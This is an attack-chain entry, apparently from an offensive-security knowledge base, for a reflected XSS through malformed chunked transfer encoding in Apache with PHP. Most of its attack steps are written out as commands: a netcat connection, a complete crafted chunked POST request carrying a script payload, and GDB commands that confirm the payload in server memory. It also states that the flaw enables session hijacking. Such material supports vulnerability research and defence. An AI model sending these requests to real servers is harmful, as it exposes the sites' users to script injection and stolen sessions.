---
id: ac-reflected-xss-chunked-php-apache
name: Reflected XSS via Malformed Chunked Transfer Encoding in PHP-Apache
type: attack_chain
description: >-
  Attack chain exploiting improper chunked request handling in PHP's
  sapi_apache2.c with Apache, leading to reflected XSS via payload injection
  into error responses.
verified: false
submitted: true
step_count: 2
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:31.881Z'
procedures:
  - '[[procedures/Send-Crafted-Chunked-POST-Request-with-XSS-Payload]]'
  - '[[procedures/Observe-and-Verify-Reflected-XSS-in-Response]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
tactics:
  - '[[Initial Access]]'
tags:
  - xss
  - reflected-xss
  - php
  - apache
  - chunked-encoding
platforms:
  - Web
tools:
  - '[[tools/Netcat]]'
  - '[[tools/GDB]]'
complexity: medium
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---

# Reflected XSS via Malformed Chunked Transfer Encoding in PHP-Apache

Multi-stage attack chain demonstrating a complete attack workflow exploiting a vulnerability in PHP's integration with Apache, where malformed chunked POST requests inject XSS payloads into server error responses.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Send Malformed Chunked Request] --> B[Payload Injection into Response]
    B --> C[Execute Reflected XSS]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Netcat]]
- [[tools/GDB]]

### Target Environment

- Apache/2.4.33 (Unix) with PHP/7.1.17
- Port 80 open for HTTP
- Network access to the target server

### Initial Access Requirements

- Direct network connectivity to the target host on port 80
- No authentication required; exploits public-facing endpoints

## Detailed Attack Procedures

### Step 1: Send Crafted Chunked POST Request
procedure: [[procedures/Send-Crafted-Chunked-POST-Request-with-XSS-Payload]]

**Objective**: Establish a connection and send a malformed chunked POST request embedding an XSS payload, triggering improper handling in sapi_apache2.c to append the payload to the response.

**Instructions**: Use [[commands/nc-connect-http]] to connect to the target, then input the crafted request using [[commands/send-chunked-xss-request]]:

```bash
nc localhost 80
```

Followed by:

```bash
POST /lol.php HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/json\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\nTransfer-Encoding: chunked\nContent-Length: 25\n\n12<script>alert(1)</script>
```

**Expected Output**: Connection established; server processes the request and prepares a 400 Bad Request response with the payload appended.

**Success Indicators**:
- Connection to port 80 succeeds
- Request sent without immediate disconnection

### Step 2: Observe Reflected XSS
procedure: [[procedures/Observe-and-Verify-Reflected-XSS-in-Response]]

**Objective**: Capture and analyze the server's response to confirm the XSS payload is reflected, enabling arbitrary JS execution.

**Instructions**: Monitor the response from the nc session for the injected payload. For deeper verification, attach [[tools/GDB]] to the Apache process and use [[commands/gdb-print-vec]] and [[commands/gdb-print-payload]] to inspect memory:

```bash
p vec[2]
```

Then:

```bash
p (char *)0x7f5115c1b17b
```

**Expected Output**: Response includes "HTTP/1.1 400 Bad Request" followed by error HTML and "<script>alert(1)</script>"; GDB shows payload in brigade bucket.

**Success Indicators**:
- Payload visible in response body
- Alert(1) executes in browser if proxied
- GDB confirms payload in iovec structure

## Attack Chain Summary

### Key Achievements

1. Successful injection of XSS payload via chunked encoding bug
2. Reflection in any endpoint's error response, enabling session hijacking
3. Verified root cause through memory inspection

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
